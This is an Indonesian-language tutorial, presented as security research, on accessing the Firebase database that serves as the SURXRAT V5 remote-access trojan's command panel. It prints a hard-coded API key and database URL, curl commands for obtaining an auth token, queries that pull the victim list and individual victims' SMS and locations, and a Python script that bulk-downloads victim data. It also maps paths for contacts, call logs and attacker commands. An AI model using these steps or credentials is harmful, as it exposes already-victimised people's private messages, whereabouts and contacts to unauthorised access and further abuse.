# Tutorial Akses Database Firebase SURXRAT V5

Panduan ini menjelaskan cara mengakses database Firebase yang digunakan oleh C2 Panel SURXRAT untuk keperluan riset keamanan dan analisis forensik.

> **Peringatan:** Gunakan informasi ini hanya untuk tujuan edukasi dan riset keamanan. Mengakses data tanpa izin dapat melanggar hukum.

---

## 1. Kredensial Firebase
Berdasarkan analisis file `index-0CLwk5Y_.js`, berikut adalah kredensial yang digunakan:

*   **Project ID:** `fir-e9e7b`
*   **Database URL:** `https://fir-e9e7b-default-rtdb.firebaseio.com`
*   **API Key:** `AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc`
*   **Auth Domain:** `fir-e9e7b.firebaseapp.com`

---

## 2. Cara Mendapatkan ID Token (Autentikasi)
Database ini dilindungi oleh Firebase Security Rules, sehingga Anda memerlukan `ID Token` yang valid untuk membaca data. Token ini didapat dengan melakukan Login (Sign In) ke Firebase Auth.

### Menggunakan cURL:
Ganti `EMAIL` dan `PASSWORD` dengan akun yang sudah terdaftar (atau daftar akun baru menggunakan endpoint `signUp`).

```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc" \
-H "Content-Type: application/json" \
-d '{
    "email": "USER_EMAIL_ANDA@gmail.com",
    "password": "PASSWORD_ANDA",
    "returnSecureToken": true
}'
```

**Hasil:** Anda akan menerima JSON yang berisi `idToken`. Copy token tersebut.

---

## 3. Cara Query Data (Realtime Database)
Setelah mendapatkan `idToken`, Anda dapat mengakses endpoint database menggunakan parameter `auth`.

### A. Melihat Daftar Victim (Metadata)
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/surxrat5.json?auth=ID_TOKEN_ANDA"
```

### B. Melihat SMS Victim Spesifik
Ganti `DEVICE_ID` dengan ID yang ditemukan di daftar victim.
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/database/sms/DEVICE_ID.json?auth=ID_TOKEN_ANDA"
```

### C. Melihat Lokasi Terakhir
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/surxrat5/DEVICE_ID/loc.json?auth=ID_TOKEN_ANDA"
```

---

## 4. Script Otomasi (Python)
Gunakan script ini untuk mengunduh data secara otomatis.

```python
import requests
import json

# Konfigurasi
API_KEY = "AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc"
DB_URL = "https://fir-e9e7b-default-rtdb.firebaseio.com"
EMAIL = "EMAIL_ANDA"
PASSWORD = "PASSWORD_ANDA"

def get_token():
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": EMAIL, "password": PASSWORD, "returnSecureToken": True}
    r = requests.post(url, json=payload)
    return r.json().get('idToken')

def fetch_data(path, token):
    url = f"{DB_URL}/{path}.json?auth={token}"
    r = requests.get(url)
    return r.json()

# Jalankan
token = get_token()
if token:
    print("Login Berhasil!")
    victims = fetch_data("surxrat5", token)
    print(f"Total Victim: {len(victims)}")
    
    # Simpan ke file
    with open('data_surxrat.json', 'w') as f:
        json.dump(victims, f, indent=4)
```

---

## 5. Struktur Database Penting
*   `surxrat5/`: Berisi metadata perangkat (Model, IP, Lokasi, Status Online).
*   `database/sms/`: Berisi seluruh log SMS masuk dan keluar.
*   `database/contacts/`: Daftar kontak telepon korban.
*   `database/calls/`: Riwayat panggilan telepon.
*   `notif/`: Log notifikasi real-time (WhatsApp, Telegram, dll).
*   `control/`: Antrian perintah (Command) yang dikirimkan attacker ke perangkat.
